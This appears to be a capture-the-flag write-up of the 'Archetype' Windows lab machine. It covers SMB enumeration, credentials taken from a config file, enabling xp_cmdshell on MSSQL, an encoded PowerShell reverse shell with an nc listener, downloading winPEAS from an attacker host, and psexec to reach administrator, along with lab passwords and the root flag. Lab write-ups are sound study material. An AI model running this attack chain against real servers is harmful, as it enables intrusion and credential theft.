#### About

Archetype is a very easy Windows machine that features a misconfigured Microsoft SQL server, exposed SMB shares and sensitive data exposure. An exposed SMB share can be accessed without authentication in which sensitive files can be found containing plaintext credentials. These credentials can be used to authenticate to MSSQL as the service account user through Impacket's mssqlclient tool. Command execution can then be achieved by enabling xp_cmdshell after which a reverse shell can be uploaded and triggered to get access to the host. Finally, WinPeas can be used to search for vulnerabilities which reveals a Powershell history file containing the password needed to achieve full privilege escalation.

Date : April 7 2026
 - - -

# What I did

```bash
Nmap scan report for 10.129.95.187
Host is up (0.21s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s

Nmap done: 1 IP address (1 host up) scanned in 30.29 seconds

```

>Which TCP port is hosting a database server?
`Looks like the port 1433 is hosting a ms sql service.`

>What is the name of the non-Administrative share available over SMB?
`backups`

```bash
> smbclient
Usage: smbclient [-?EgqBNPkV] [-?|--help] [--usage] [-M|--message=HOST]
        [-I|--ip-address=IP] [-E|--stderr] [-L|--list=HOST]
        [...]
        
> smbclient -L 10.129.95.187
Password for [WORKGROUP\guillaume]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
SMB1 disabled -- no workgroup available
```


>What is the password identified in the file on the SMB share?
Password=`M3g4c0rp123`

```bash
> smbclient //10.129.95.187/backups
Password for [WORKGROUP\guillaume]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Mon Jan 20 09:20:57 2020
  ..                                  D        0  Mon Jan 20 09:20:57 2020
  prod.dtsConfig                     AR      609  Mon Jan 20 09:23:02 2020

		5056511 blocks of size 4096. 2596869 blocks available
smb: \> mget prod.dtsConfig 
Get file prod.dtsConfig? y
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.4 KiloBytes/sec) (average 0.4 KiloBytes/sec)


> cat prod.dtsConfig
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>%                                                            
```


>What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server?

`mssqlclient.py`

After cloning and installing impacket : 

```bash
~/Dow/impacket/examples on master ?1 > mssqlclient.py ARCHETYPE/sql_svc:M3g4c0rp123@10.129.95.187 -windows-auth

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> 

```

We are now connected to mssql server on the machine.

>What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?

`xp_cmdshell`

```bash
SQL (ARCHETYPE\sql_svc  dbo@master)> enable_xp_cmdshell
INFO(ARCHETYPE): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL (ARCHETYPE\sql_svc  dbo@master)> RECONFIGURE
SQL (ARCHETYPE\sql_svc  dbo@master)> EXEC xp_cmdshell 'whoami';
output              
-----------------   
archetype\sql_svc   
NULL                

```

Using this resource https://www.hackingarticles.in/mssql-for-pentester-command-execution-with-xp_cmdshell/

I found the information needed to run a reverse shell using the xp_cmdshell command.
```bash
EXEC xp_cmdshell 'powershell -e JAB[...]CkA';
```

In another tab :
```bash
> nc -lvnp 4444
Listening on 0.0.0.0 4444
Connection received on 10.129.95.187 49675

PS C:\Windows\system32> 
PS C:\Windows\system32> whoami
archetype\sql_svc
```



>What script can be used in order to search possible paths to escalate privileges on Windows hosts?

`winpeas`

In windows, there is a built in tool to download scripts from remote.
```bash

Invoke-WebRequest -Uri "https://example.com" -OutFile "C:\path\to\script.ps1"



PS C:\Windows\Temp> Invoke-WebRequest -Uri "http://10.10.15.222/winPEAS.ps1" -OutFile "C:\Windows\Temp\check.ps1"

PS C:\Windows\Temp> dir C:\Windows\Temp\check.ps1


    Directory: C:\Windows\Temp


Mode                LastWriteTime         Length Name                                                                  
----                -------------         ------ ----                                                                  
-a----        4/10/2026  11:13 AM          94187 check.ps1                                    
```                         

winPEAS is supposed to scan files to find possible privilege escalation. It was really difficult to get a result in the reverse shell so I searched for an alternative. Turns out in powershell there is a file that saves the console history (where we wanted to search for the credentials).

```bash
PS C:\Windows\system32> PS C:\Windows\system32> type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```


Now that we have the admin credentials, we must connect to the machine as admin. To do that, I will use impacket tool.

Impacket's `psexec.py` is a Python-based tool in the [Impacket library](https://github.com/fortra/impacket) that replicates the functionality of Sysinternals PsExec. It allows users to execute remote commands on Windows systems via SMB, creating a temporary service for interaction.


```bash
> ./psexec.py Administrator:'MEGACORP_4dm1n!!'@10.129.37.5
Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.129.37.5.....
[*] Found writable share ADMIN$
[*] Uploading file JJdfHykR.exe
[*] Opening SVCManager on 10.129.37.5.....
[*] Creating service oEmK on 10.129.37.5.....
[*] Starting service oEmK.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd C:\Users\Administrator\Desktop

C:\Users\Administrator\Desktop> dir
 Volume in drive C has no label.
 Volume Serial Number is 9565-0B4F

 Directory of C:\Users\Administrator\Desktop

07/27/2021  02:30 AM    <DIR>          .
07/27/2021  02:30 AM    <DIR>          ..
02/25/2020  07:36 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)  10,694,529,024 bytes free

C:\Users\Administrator\Desktop> type root.txt
b91ccec3305e98240082d4474b848528
```
